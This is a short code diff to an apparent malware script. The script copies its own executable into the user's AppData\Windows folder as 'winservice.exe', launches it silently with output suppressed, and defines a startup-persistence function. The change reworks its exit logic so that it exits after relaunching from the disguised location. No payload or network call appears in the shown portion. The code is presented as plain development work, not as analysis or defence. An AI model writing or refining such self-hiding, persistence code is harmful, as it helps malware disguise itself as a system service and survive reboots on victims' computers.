@@ -19,9 +19,6 @@ exe_path = sys.executable
 roaming = os.environ["APPDATA"]
 target_dir = os.path.join(roaming, "Windows")
 
-if os.path.commonpath([exe_path, target_dir]) == target_dir:
-    sys.exit()
-
 new_exe_name = "winservice.exe"
 target_exe = os.path.join(target_dir, new_exe_name)
 
@@ -34,6 +31,7 @@ if not os.path.exists(target_exe):
         stdout=subprocess.DEVNULL,
         stderr=subprocess.DEVNULL
     )
+    sys.exit()
 
 def ensure_startup_persistence():
     exe_name = os.path.splitext(os.path.basename(exe_path))[0]
